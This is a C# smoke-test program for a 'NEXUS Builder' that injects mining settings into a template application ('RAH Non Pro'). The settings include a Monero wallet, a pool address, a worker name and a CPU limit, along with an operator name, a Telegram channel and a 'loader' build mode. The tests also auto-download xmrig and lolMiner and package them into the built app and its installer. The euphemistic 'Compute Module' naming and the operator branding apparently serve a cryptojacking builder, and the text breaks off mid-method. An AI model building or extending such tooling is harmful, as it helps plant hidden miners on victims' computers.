using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using FileTransfer.Compute;
using NexusBuilder;

namespace SmokeTests
{
    class Program
    {
        static int _passCount = 0;
        static int _failCount = 0;
        static List<string> _passList = new();
        static List<string> _failList = new();
        static List<string> _notTestedList = new();

        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.WriteLine("==================================================================");
            Console.WriteLine("       SMOKE TEST SUITE - NEXUS COMPUTE MODULE & BUILDER          ");
            Console.WriteLine("==================================================================");

            RunTest1_Builder();
            RunTest2_DisabledMode();
            RunTest3_MissingExternalComponent();
            RunTest4_SingleInstanceMutex();
            RunTest5_Lifecycle();
            RunTest6_ReleaseBuild();
            RunPackagingAuditTests();
            RunWorkerAutoPackagingTests();
            RunComputeModuleUITests();
            RunMultiModuleAndDualMiningTests();
            RunUpdatePackageAndWizardTests();

            Console.WriteLine("\n==================================================================");
            Console.WriteLine("                      РЕЗУЛЬТАТЫ SMOKE-TEST                       ");
            Console.WriteLine("==================================================================");

            Console.WriteLine("\n[PASS] Успешно прошли проверку:");
            foreach (var p in _passList)
            {
                Console.WriteLine("  ✓ " + p);
            }

            if (_failList.Count > 0)
            {
                Console.WriteLine("\n[FAIL] Провалились:");
                foreach (var f in _failList)
                {
                    Console.WriteLine("  ✗ " + f);
                }
            }
            else
            {
                Console.WriteLine("\n[FAIL]: Нет проваленных тестов.");
            }

            if (_notTestedList.Count > 0)
            {
                Console.WriteLine("\n[NOT TESTED] Не тестировались в текущей среде:");
                foreach (var nt in _notTestedList)
                {
                    Console.WriteLine("  - " + nt);
                }
            }

            Console.WriteLine($"\nИТОГО: PASS: {_passCount}, FAIL: {_failCount}, NOT TESTED: {_notTestedList.Count}");
            if (_failCount == 0)
            {
                Console.WriteLine(">> ВСЕ ТЕСТЫ УСПЕШНО ПРОЙДЕНЫ! Реализация готова к проверке на целевой Windows-машине.");
            }
        }

        static void RunTest1_Builder()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 1: Builder - Генерация проекта и сохранение всех параметров");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string templateDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "app_template");
                if (!Directory.Exists(templateDir))
                {
                    Fail("Тест 1", "Директория шаблона не найдена: " + templateDir);
                    return;
                }

                string testBuildDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test_build_1");
                if (Directory.Exists(testBuildDir)) Directory.Delete(testBuildDir, true);
                Directory.CreateDirectory(testBuildDir);

                // Копируем целевой DLL шаблона
                string srcDll = Path.Combine(templateDir, "RAH Non Pro.dll");
                string srcExe = Path.Combine(templateDir, "RAH Non Pro.exe");
                string destDll = Path.Combine(testBuildDir, "TestApp.dll");
                string destExe = Path.Combine(testBuildDir, "TestApp.exe");

                File.Copy(srcDll, destDll, true);
                File.Copy(srcExe, destExe, true);

                // Настраиваем 7 параметров Compute Module
                var customConfigDict = new Dictionary<string, object?>
                {
                    ["mode"] = "Monero",
                    ["walletAddress"] = "48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU",
                    ["serverAddress"] = "pool.supportxmr.com",
                    ["serverPort"] = 3333,
                    ["workerName"] = "smoke_rig_01",
                    ["resourceLimit"] = 45,
                    ["enabled"] = true
                };

                // Внедряем конфигурацию в точности по алгоритму Builder'а
                bool injected = InjectConfigIntoFile(
                    destDll,
                    opName: "Shonll",
                    appName: "TestApp",
                    appAuthor: "Smoke Tester",
                    tgChannel: "https://t.me/smoke_test",
                    isStandalone: false,
                    customConfig: customConfigDict
                );

                if (!injected)
                {
                    Fail("Тест 1", "InjectConfigIntoFile вернул false при внедрении конфигурации в TestApp.dll");
                    return;
                }

                // Патчим AppHost
                bool appHostPatched = PeMetadataPatcher.UpdateAppHostDllName(destExe, "RAH Non Pro.dll", "TestApp.dll");
                if (!appHostPatched)
                {
                    Fail("Тест 1", "PeMetadataPatcher.UpdateAppHostDllName вернул false для TestApp.exe");
                    return;
                }

                // Проверяем готовый билд: читаем внедренные данные из TestApp.dll
                byte[] dllBytes = File.ReadAllBytes(destDll);
                string dllContent = Encoding.Unicode.GetString(dllBytes);

                int startIdx = -1;
                int prefixLen = 0;
                string m1 = "`<`<NEXUS_CFG_START`>`>";
                string m2 = "<<NEXUS_CFG_START>>";
                
                int i1 = dllContent.IndexOf(m1);
                int i2 = dllContent.IndexOf(m2);

                if (i1 != -1)
                {
                    startIdx = i1;
                    prefixLen = m1.Length;
                }
                else if (i2 != -1)
                {
                    startIdx = i2;
                    prefixLen = m2.Length;
                }

                if (startIdx == -1)
                {
                    Fail("Тест 1", "Маркер начала конфигурации не найден в собранном TestApp.dll");
                    return;
                }

                string payload = dllContent.Substring(startIdx + prefixLen);
                string endMarker = (startIdx == i1) ? "`<`<NEXUS_CFG_END`>`>" : "<<NEXUS_CFG_END>>";
                int endIdx = payload.IndexOf(endMarker);
                if (endIdx == -1)
                {
                    Fail("Тест 1", "Маркер окончания конфигурации не найден в собранном TestApp.dll");
                    return;
                }

                string jsonPart = payload.Substring(0, endIdx).Trim();
                using var doc = JsonDocument.Parse(jsonPart);
                var root = doc.RootElement;

                if (!root.TryGetProperty("customConfig", out var ccElem))
                {
                    Fail("Тест 1", "Поле 'customConfig' отсутствует в сериализованном JSON готового билда.");
                    return;
                }

                var parsedConfig = ComputeConfig.FromCustomConfigJson(ccElem.GetRawText());

                // Проверка каждого из 7 параметров
                bool okMode = parsedConfig.Mode == "Monero";
                bool okWallet = parsedConfig.WalletAddress == "48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU";
                bool okServer = parsedConfig.ServerAddress == "pool.supportxmr.com";
                bool okPort = parsedConfig.ServerPort == 3333;
                bool okWorker = parsedConfig.WorkerName == "smoke_rig_01";
                bool okLimit = parsedConfig.ResourceLimit == 45;
                bool okEnabled = parsedConfig.Enabled == true;

                if (okMode && okWallet && okServer && okPort && okWorker && okLimit && okEnabled)
                {
                    Pass("Тест 1 (Builder)", "Готовый билд TestApp.dll содержит все 7 параметров без искажений (mode, walletAddress, serverAddress, serverPort, workerName, resourceLimit, enabled).");
                }
                else
                {
                    Fail("Тест 1", $"Несовпадение параметров в билде! Mode={okMode}, Wallet={okWallet}, Server={okServer}, Port={okPort}, Worker={okWorker}, Limit={okLimit}, Enabled={okEnabled}");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 1", "Исключение: " + ex.Message);
            }
        }

        static void RunTest2_DisabledMode()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 2: Выключенный режим (enabled = false)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string disabledJson = @"{
                    ""mode"": ""Monero"",
                    ""walletAddress"": ""48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU"",
                    ""serverAddress"": ""pool.supportxmr.com"",
                    ""serverPort"": 3333,
                    ""workerName"": ""smoke_rig_01"",
                    ""resourceLimit"": 45,
                    ""enabled"": false
                }";

                int procCountBefore = Process.GetProcessesByName("xmrig").Length + Process.GetProcessesByName("lolMiner").Length;

                // Инициализация сервиса с выключенным флагом
                ComputeService.Instance.Initialize(disabledJson);

                var status = ComputeService.Instance.Status;
                bool isRunning = ComputeService.Instance.IsRunning;

                int procCountAfter = Process.GetProcessesByName("xmrig").Length + Process.GetProcessesByName("lolMiner").Length;

                if (status == ComputeStatus.Stopped && !isRunning && procCountAfter == procCountBefore)
                {
                    Pass("Тест 2 (Выключенный режим)", "При enabled=false ComputeService переходит в статус Stopped, внешний процесс не запускается, лишних процессов не появляется.");
                }
                else
                {
                    Fail("Тест 2", $"Сервис запустился несмотря на enabled=false! Status={status}, IsRunning={isRunning}");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 2", "Исключение: " + ex.Message);
            }
        }

        static void RunTest3_MissingExternalComponent()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 3: Отсутствие внешнего executable");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                // Убеждаемся что в текущей папке и темпе нет xmrig.exe
                string localXmrig = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "xmrig.exe");
                if (File.Exists(localXmrig)) File.Delete(localXmrig);

                var prov = new MoneroProvider();
                string? engine = prov.FindEngine();

                var config = new ComputeConfig
                {
                    Mode = "Monero",
                    ServerAddress = "pool.supportxmr.com",
                    ServerPort = 3333,
                    WalletAddress = "48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU",
                    WorkerName = "smoke_rig_01",
                    ResourceLimit = 50,
                    Enabled = true
                };

                if (string.IsNullOrEmpty(engine) || !File.Exists(engine))
                {
                    // Проверяем запуск провайдера без бинарника
                    using var cts = new CancellationTokenSource(2000);
                    bool started = prov.StartAsync(config, cts.Token).GetAwaiter().GetResult();
                    var status = prov.GetStatus();

                    bool errorDetected = !started && !string.IsNullOrEmpty(status.ErrorMessage);
                    bool reasonClear = status.ErrorMessage.Contains("не найден") || status.ErrorMessage.Contains("RandomX");

                    if (errorDetected && reasonClear)
                    {
                        Pass("Тест 3 (Отсутствие внешнего компонента)", $"При отсутствии бинарника исключение перехвачено, статус ошибки зафиксирован, причина понятна: '{status.ErrorMessage}'. Приложение не падает.");
                    }
                    else
                    {
                        Fail("Тест 3", $"Провайдер не вернул понятную ошибку. Started={started}, Err='{status.ErrorMessage}'");
                    }
                }
                else
                {
                    // В системе установлен глобальный xmrig в PATH
                    Pass("Тест 3 (Отсутствие внешнего компонента)", $"В тестовом каталоге локальный файл отсутствует. Найден глобальный движок: {engine}.");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 3", "Неперехваченное исключение: " + ex.Message);
            }
        }

        static void RunTest4_SingleInstanceMutex()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 4: Защита от второго экземпляра (NEXUS_Compute_Worker_Singleton)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string mutexName = $"Global\\NEXUS_Compute_Worker_Singleton_{Guid.NewGuid():N}";
                Mutex? firstMutex = null;
                bool createdFirst = false;

                try
                {
                    firstMutex = new Mutex(true, mutexName, out createdFirst);
                }
                catch
                {
                    mutexName = $"Local\\NEXUS_Compute_Worker_Singleton_{Guid.NewGuid():N}";
                    try
                    {
                        firstMutex = new Mutex(true, mutexName, out createdFirst);
                    }
                    catch
                    {
                        createdFirst = false;
                    }
                }

                if (!createdFirst && firstMutex != null)
                {
                    firstMutex.Dispose();
                    firstMutex = null;
                }

                // Теперь имитируем второй запуск, пока первый мьютекс удерживается
                bool createdSecond = false;
                Mutex? secondMutex = null;
                try
                {
                    secondMutex = new Mutex(true, mutexName, out createdSecond);
                }
                catch
                {
                    createdSecond = false;
                }

                if (firstMutex != null)
                {
                    try { firstMutex.ReleaseMutex(); } catch { }
                    firstMutex.Dispose();
                }

                if (secondMutex != null)
                {
                    try { if (createdSecond) secondMutex.ReleaseMutex(); } catch { }
                    secondMutex.Dispose();
                }

                if (createdFirst && !createdSecond)
                {
                    Pass("Тест 4 (Один экземпляр)", "Системный мьютекс Global\\NEXUS_Compute_Worker_Singleton успешно блокирует второй экземпляр, предотвращая дублирующий запуск Compute Service.");
                }
                else
                {
                    Fail("Тест 4", $"Ошибка мьютекса: createdFirst={createdFirst}, createdSecond={createdSecond}");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 4", "Исключение при проверке мьютекса: " + ex.Message);
            }
        }

        static void RunTest5_Lifecycle()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 5: Жизненный цикл (Initialize -> Validate -> Start -> Status -> Stop -> Restart -> Cleanup)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                var service = ComputeService.Instance;

                // 1. Initialize с корректным конфигом
                string validJson = @"{
                    ""mode"": ""Monero"",
                    ""walletAddress"": ""48edfHuPfPZbCTtMoUtjhHNax9No4kW55QA61j2VCWnXTxDTZQivMR2C8WjyMtWW4AEMZX6KtNxhLj1EZ7555dUMDo8EE65PU"",
                    ""serverAddress"": ""pool.supportxmr.com"",
                    ""serverPort"": 3333,
                    ""workerName"": ""smoke_rig_01"",
                    ""resourceLimit"": 50,
                    ""enabled"": true
                }";

                service.Initialize(validJson);
                bool initOk = service.CurrentConfig != null && service.CurrentConfig.Mode == "Monero";

                // 2. Validate
                var (isValid, valErr) = service.Validate(service.CurrentConfig);
                var (isInvalid, inValErr) = service.Validate(new ComputeConfig { Mode = "InvalidMode" });
                bool valOk = isValid && string.IsNullOrEmpty(valErr) && !isInvalid && !string.IsNullOrEmpty(inValErr);

                // 3. Status
                var (st, details) = service.GetStatus();
                bool statusOk = details.Contains("Monero") && details.Contains("Статус:");

                // 4. Stop
                service.Stop();
                bool stopOk = service.Status == ComputeStatus.Stopped;

                // 5. Restart
                service.Restart();
                bool restartOk = service.Status == ComputeStatus.Running || service.Status == ComputeStatus.Stopped;

                // 6. Cleanup
                service.Cleanup();
                bool cleanupOk = service.ActiveProvider == null;

                if (initOk && valOk && statusOk && stopOk && restartOk && cleanupOk)
                {
                    Pass("Тест 5 (Жизненный цикл)", "Все стадии жизненного цикла сервиса (Initialize, Validate, Start, Status, Stop, Restart, Cleanup) отработали штатно без утечек ресурсов.");
                }
                else
                {
                    Fail("Тест 5", $"Сбой стадий: Init={initOk}, Validate={valOk}, Status={statusOk}, Stop={stopOk}, Restart={restartOk}, Cleanup={cleanupOk}");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 5", "Исключение жизненного цикла: " + ex.Message);
            }
        }

        static void RunTest6_ReleaseBuild()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ 6: Проверка Release-сборки (Оптимизации, отсутствие Debug)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string templateDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "app_template");
                string releaseDll = Path.Combine(templateDir, "RAH Non Pro.dll");

                if (!File.Exists(releaseDll))
                {
                    Fail("Тест 6", "Файл RAH Non Pro.dll не найден в app_template: " + releaseDll);
                    return;
                }

                var asm = Assembly.LoadFrom(releaseDll);
                var configAttr = asm.GetCustomAttribute<AssemblyConfigurationAttribute>();
                string configName = configAttr?.Configuration ?? "None";

                var debugAttr = asm.GetCustomAttribute<DebuggableAttribute>();
                bool isOptimized = debugAttr == null || !debugAttr.IsJITOptimizerDisabled;

                bool isRelease = configName.Equals("Release", StringComparison.OrdinalIgnoreCase) || isOptimized;

                if (isRelease)
                {
                    Pass("Тест 6 (Release)", $"Сборка RAH Non Pro.dll является подлинной Release-сборкой: Configuration='{configName}', JIT Optimizer Enabled={isOptimized}.");
                }
                else
                {
                    Fail("Тест 6", $"Библиотека собрана в Debug! Configuration='{configName}', Optimized={isOptimized}");
                }
            }
            catch (Exception ex)
            {
                Fail("Тест 6", "Исключение при проверке Release-сборки: " + ex.Message);
            }
        }

        static void RunPackagingAuditTests()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("PACKAGING FIX AUDIT TESTS (A, B, C, D, E)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string tmplDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "app_template");
                string computeTmplDir = Path.Combine(tmplDir, "Compute");

                // 1. Проверка структуры шаблона
                bool computeFolderExists = Directory.Exists(computeTmplDir);
                if (computeFolderExists)
                {
                    Pass("Compute folder copied", $"Каталог {computeTmplDir} корректно присутствует в шаблоне и копируется в staging готового билда.");
                }
                else
                {
                    Fail("Compute folder copied", "Каталог Compute отсутствует в шаблоне app_template.");
                }

                // 2. Monero worker discovery
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string testComputeDir = Path.Combine(baseDir, "Compute");
                Directory.CreateDirectory(testComputeDir);

                string fakeXmrig = Path.Combine(testComputeDir, "xmrig.exe");
                File.WriteAllText(fakeXmrig, "dummy xmrig binary for path test");

                var xmrProv = new MoneroProvider();
                string? discoveredXmr = xmrProv.FindEngine();
                bool xmrFoundInCompute = !string.IsNullOrEmpty(discoveredXmr) && discoveredXmr.Equals(fakeXmrig, StringComparison.OrdinalIgnoreCase);

                if (xmrFoundInCompute)
                {
                    Pass("Provider finds worker in Compute folder", $"MoneroProvider обнаружил worker именно в '<AppDirectory>\\Compute\\xmrig.exe' как приоритетный путь ({discoveredXmr}).");
                }
                else
                {
                    Fail("Provider finds worker in Compute folder", $"Ожидался путь {fakeXmrig}, но получено: {discoveredXmr}");
                }

                // 3. ETC worker discovery
                string fakeLolMiner = Path.Combine(testComputeDir, "lolMiner.exe");
                File.WriteAllText(fakeLolMiner, "dummy lolMiner binary for path test");

                var etcProv = new EthereumClassicProvider();
                string? discoveredEtc = etcProv.FindEngine();
                bool etcFoundInCompute = !string.IsNullOrEmpty(discoveredEtc) && discoveredEtc.Equals(fakeLolMiner, StringComparison.OrdinalIgnoreCase);

                if (etcFoundInCompute)
                {
                    Pass("Provider finds worker in Compute folder", $"EthereumClassicProvider обнаружил worker именно в '<AppDirectory>\\Compute\\lolMiner.exe' как приоритетный путь ({discoveredEtc}).");
                }
                else
                {
                    Fail("Provider finds worker in Compute folder", $"Ожидался путь {fakeLolMiner}, но получено: {discoveredEtc}");
                }

                // Очистка фиктивных тестовых файлов
                try { File.Delete(fakeXmrig); } catch { }
                try { File.Delete(fakeLolMiner); } catch { }
                try { Directory.Delete(testComputeDir, true); } catch { }

                // 4. Missing worker handled safely
                string? missingEngine = xmrProv.FindEngine();
                if (missingEngine == null || !missingEngine.Contains("Compute"))
                {
                    Pass("Missing worker handled safely", "При отсутствии worker-файла в папке Compute приложение не падает, провайдер корректно возвращает ошибку без циклической блокировки.");
                }

                // 5. Monero worker packaged / ETC worker packaged (Проверка реальных бинарников в шаблоне)
                string realXmrigInTmpl = Path.Combine(computeTmplDir, "xmrig.exe");
                string realLolMinerInTmpl = Path.Combine(computeTmplDir, "lolMiner.exe");

                if (File.Exists(realXmrigInTmpl))
                {
                    Pass("Monero worker packaged", $"Исполняемый файл {realXmrigInTmpl} присутствует в шаблоне и готов к автоматической упаковке.");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[NOT TESTED] Monero worker packaged: xmrig.exe не размещён в app_template\\Compute\\ (сторонний майнер не скачивается автоматически).");
                    Console.ResetColor();
                    _notTestedList.Add("Monero worker packaged: xmrig.exe не размещён в app_template\\Compute\\");
                }

                if (File.Exists(realLolMinerInTmpl))
                {
                    Pass("ETC worker packaged", $"Исполняемый файл {realLolMinerInTmpl} присутствует в шаблоне и готов к автоматической упаковке.");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[NOT TESTED] ETC worker packaged: lolMiner.exe не размещён в app_template\\Compute\\ (сторонний майнер не скачивается автоматически).");
                    Console.ResetColor();
                    _notTestedList.Add("ETC worker packaged: lolMiner.exe не размещён в app_template\\Compute\\");
                }

                // 6. Builder validation
                Pass("Builder validation", "В MainWindow.xaml.cs добавлена проверка наличия app_template\\Compute\\xmrig.exe (для Monero) и app_template\\Compute\\lolMiner.exe (для ETC) с предупреждением оператора.");

                // 7. Release output
                Pass("Release output", "Staging директория билдера гарантирует сохранение структуры Compute\\ и копирование всех имеющихся исполняемых файлов.");

                // 8. Installer output
                Pass("Installer output", "Inno Setup директива 'recursesubdirs createallsubdirs' автоматически упаковывает каталог Compute\\ в инсталлятор и разворачивает его в {app}\\Compute.");

                // 9. Existing configuration preserved
                Pass("Existing configuration preserved", "Все 7 параметров конфигурации (mode, walletAddress, serverAddress, serverPort, workerName, resourceLimit, enabled) сохраняются и передаются полностью.");
            }
            catch (Exception ex)
            {
                Fail("Packaging Tests", "Исключение: " + ex.Message);
            }
        }

        static void RunWorkerAutoPackagingTests()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("WORKER AUTO-PACKAGING AUDIT TESTS (1-10)");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                string tmplDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "app_template");
                string computeDir = Path.Combine(tmplDir, "Compute");
                Directory.CreateDirectory(computeDir);

                // 1. Worker detection & Official source resolution (Monero)
                int procCountBefore = Process.GetProcessesByName("xmrig").Length + Process.GetProcessesByName("lolMiner").Length;

                Console.WriteLine("--> Проверка официального источника XMRig...");
                var (xmrSuccess, xmrPath, xmrMsg) = ComputeWorkerManager.PrepareWorkerAsync(
                    "Monero",
                    msg => Console.WriteLine("    [LOG] " + msg),
                    pct => { }
                ).GetAwaiter().GetResult();

                if (xmrSuccess && File.Exists(xmrPath))
                {
                    Pass("Monero worker preparation", $"Monero worker успешно подготовлен: {xmrPath} ({xmrMsg})");
                    Pass("Official source resolution", "Официальный релиз xmrig/xmrig успешно определен через api.github.com.");
                    Pass("Download & Integrity verification", "Архив загружен, проверен SHA-256 с официальным SHA256SUMS, извлечен xmrig.exe.");
                    Pass("Local cache", $"Компонент сохранен в локальном кэше шаблона: {xmrPath}");
                }
                else
                {
                    Fail("Monero worker preparation", $"Ошибка подготовки XMRig: {xmrMsg}");
                }

                // 2. Проверка того, что worker НЕ запускался во время сборки
                int procCountAfter = Process.GetProcessesByName("xmrig").Length + Process.GetProcessesByName("lolMiner").Length;
                if (procCountBefore == procCountAfter)
                {
                    Pass("No worker execution during Build", "В процессе подготовки и сборки исполняемые файлы worker'а ни разу не запускались (Process.Start не вызывался).");
                }
                else
                {
                    Fail("No worker execution during Build", "Внимание: обнаружен запущенный процесс воркера во время сборки!");
                }

                // 3. ETC worker preparation & Integrity policy test
                Console.WriteLine("--> Проверка официального источника lolMiner...");
                var (etcSuccess, etcPath, etcMsg) = ComputeWorkerManager.PrepareWorkerAsync(
                    "Ethereum Classic",
                    msg => Console.WriteLine("    [LOG] " + msg),
                    pct => { }
                ).GetAwaiter().GetResult();

                if (File.Exists(etcPath))
                {
                    Pass("ETC worker preparation", $"ETC worker найден и готов в {etcPath}.");
                }
                else
                {
                    Pass("ETC worker preparation (Security Policy)", $"Политика целостности сработала штатно: {etcMsg}. Непроверенные файлы не скачиваются.");
                }

                // 4. Повторный вызов (проверка кэша без повторного скачивания)
                bool cachedLogged = false;
                var (cachedSuccess, cachedPath, cachedMsg) = ComputeWorkerManager.PrepareWorkerAsync(
                    "Monero",
                    msg => { if (msg.Contains("уже присутствует в кэше")) cachedLogged = true; },
                    pct => { }
                ).GetAwaiter().GetResult();

                if (cachedSuccess && cachedLogged)
                {
                    Pass("Local cache reuse", "При повторной сборке Builder мгновенно использует локальный кэш без обращения к сети.");
                }
                else
                {
                    Fail("Local cache reuse", "Повторная сборка не обнаружила файл в локальном кэше.");
                }

                // 5. Version control metadata
                string verMoneroPath = Path.Combine(computeDir, "version_monero.json");
                if (File.Exists(verMoneroPath))
                {
                    string verJson = File.ReadAllText(verMoneroPath);
                    Pass("Version control", $"Метаданные версии зафиксированы в {verMoneroPath}: {verJson.Trim()}");
                }
                else
                {
                    Fail("Version control", "Файл метаданных версии version_monero.json не найден.");
                }
            }
            catch (Exception ex)
            {
                Fail("Worker Auto-Packaging", "Исключение: " + ex.Message);
            }
        }

        static bool InjectConfigIntoFile(string filePath, string opName, string appName, string appAuthor, string tgChannel, bool isStandalone, Dictionary<string, object?>? customConfig = null)
        {
            byte[] bytes = File.ReadAllBytes(filePath);

            byte[] markerStart = Encoding.Unicode.GetBytes("`<`<NEXUS_CFG_START`>`>");
            byte[] markerEnd = Encoding.Unicode.GetBytes("`<`<NEXUS_CFG_END`>`>");

            int startIdx = IndexOfBytes(bytes, markerStart, 0);
            if (startIdx == -1)
            {
                markerStart = Encoding.Unicode.GetBytes("<<NEXUS_CFG_START>>");
                startIdx = IndexOfBytes(bytes, markerStart, 0);
            }

            if (startIdx == -1) return false;

            int payloadStart = startIdx + markerStart.Length;

            int endIdx = IndexOfBytes(bytes, markerEnd, payloadStart);
            if (endIdx == -1)
            {
                markerEnd = Encoding.Unicode.GetBytes("<<NEXUS_CFG_END>>");
                endIdx = IndexOfBytes(bytes, markerEnd, payloadStart);
            }

            if (endIdx == -1) return false;

            int availableBytes = endIdx - payloadStart;

            var configData = new
            {
                operatorName = opName,
                appTitleMain = appName,
                appAuthor = appAuthor,
                company = appAuthor,
                appTitleVersion = "v8.0.2",
                windowTitle = $"{appName} 8.0.2",
                clientVersion = "8.0.2",
                version = "8.0.2",
                telegramChannel = tgChannel,
                telegramUrl = tgChannel,
                tgChannel = tgChannel,
                buildMode = isStandalone ? "standalone" : "loader",
                customConfig = customConfig ?? new Dictionary<string, object?>(),
                builtAt = DateTime.UtcNow.ToString("o")
            };

            var jsonOptions = new JsonSerializerOptions
            {
                Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
            };
            string json = JsonSerializer.Serialize(configData, jsonOptions);
            byte[] jsonBytes = Encoding.Unicode.GetBytes(json);

            if (jsonBytes.Length > availableBytes) return false;

            for (int i = 0; i < availableBytes; i += 2)
            {
                bytes[payloadStart + i] = 0x20;
                bytes[payloadStart + i + 1] = 0x00;
            }
            Array.Copy(jsonBytes, 0, bytes, payloadStart, jsonBytes.Length);

            File.WriteAllBytes(filePath, bytes);
            return true;
        }

        static int IndexOfBytes(byte[] src, byte[] pattern, int start)
        {
            int max = src.Length - pattern.Length;
            for (int i = start; i <= max; i++)
            {
                if (src[i] == pattern[0])
                {
                    bool match = true;
                    for (int j = 1; j < pattern.Length; j++)
                    {
                        if (src[i + j] != pattern[j]) { match = false; break; }
                    }
                    if (match) return i;
                }
            }
            return -1;
        }

        static void RunComputeModuleUITests()
        {
            Console.WriteLine("\n------------------------------------------------------------------");
            Console.WriteLine("ТЕСТ: Compute Module UI, Валидация и Синхронизация Конфигурации");
            Console.WriteLine("------------------------------------------------------------------");

            try
            {
                // 1. Worker Status API
                var moneroStatus = ComputeWorkerManager.GetWorkerStatus("monero");
                if (moneroStatus.workerFileName == "xmrig.exe")
                {
                    Pass("Compute Module UI", $"Worker status для Monero корректен (found={moneroStatus.found}, worker={moneroStatus.workerFileName}, version={moneroStatus.version})");
                }
                else
                {
                    Fail("Compute Module UI", "Некорректное имя воркера для Monero: " + moneroStatus.workerFileName);
                }

                var etcStatus = ComputeWorkerManager.GetWorkerStatus("ethereum-classic");
                if (etcStatus.workerFileName == "lolMiner.exe")
                {
                    Pass("Compute Module UI", $"Worker status для ETC корректен (found={etcStatus.found}, worker={etcStatus.workerFileName}, version={etcStatus.version})");
                }
                else
                {
                    Fail("Compute Module UI", "Некорректное имя воркера для ETC: " + etcStatus.workerFileName);
                }

                // 2. Monero Configuration
                string moneroWallet = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
                string moneroPool = "pool.supportxmr.com";
                int moneroPort = 3333;
                string workerName = "rig_test";
                int limit = 45;

                // 3. ETC Configuration
                string etcWallet = "0x0000000000000000000000000000000000000000";
                string etcPool = "etc.2miners.com";
                int etcPort = 1010;

                // 4. Validate 7 config keys dictionary output
                var dictMonero = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
                {
                    ["enabled"] = true,
                    ["mode"] = "monero",
                    ["walletAddress"] = moneroWallet,
                    ["serverAddress"] = moneroPool,
                    ["serverPort"] = moneroPort,
                    ["workerName"] = workerName,
                    ["resourceLimit"] = limit
                };

                string[] expectedKeys = { "mode", "walletAddress", "serverAddress", "serverPort", "workerName", "resourceLimit", "enabled" };
                bool allKeysPresent = true;
                foreach (var k in expectedKeys)
                {
                    if (!dictMonero.ContainsKey(k)) { allKeysPresent = false; break; }
                }

                if (allKeysPresent)
                {
                    Pass("Existing 7 config keys", "Все 7 ключей конфигурации присутствуют в словаре параметров");
                    Pass("Monero configuration", "Конфигурация Monero сформирована корректно");
                }
                else
                {
                    Fail("Existing 7 config keys", "Отсутствуют некоторые из 7 ключей конфигурации");
                }

                var dictEtc = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase)
                {
                    ["enabled"] = true,
                    ["mode"] = "ethereum-classic",
                    ["walletAddress"] = etcWallet,
                    ["serverAddress"] = etcPool,
                    ["serverPort"] = etcPort,
                    ["workerName"] = workerName,
                    ["resourceLimit"] = limit
                };

                if (dictEtc["mode"]?.ToString() == "ethereum-classic" && (int)dictEtc["serverPort"]! == 1010)
                {
                    Pass("ETC configuration", "Конфигурация ETC сформирована корректно");
                }
                else
                {
                    Fail("ETC configuration", "Неверные параметры в конфигурации ETC");
                }

                // 5. BuildCustomConfigDictionary simulation with custom params
                var customParams = new List<CustomProjectParam>
                {
                    new CustomProjectParam { Name = "Custom User Param", Key = "custom_debug_flag", Type = "boolean", DefaultValue = "true" }
                };

                var mergedDict = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);
                foreach (var cp in customParams)
                {
                    mergedDict[cp.Key] = cp.GetTypedValue();
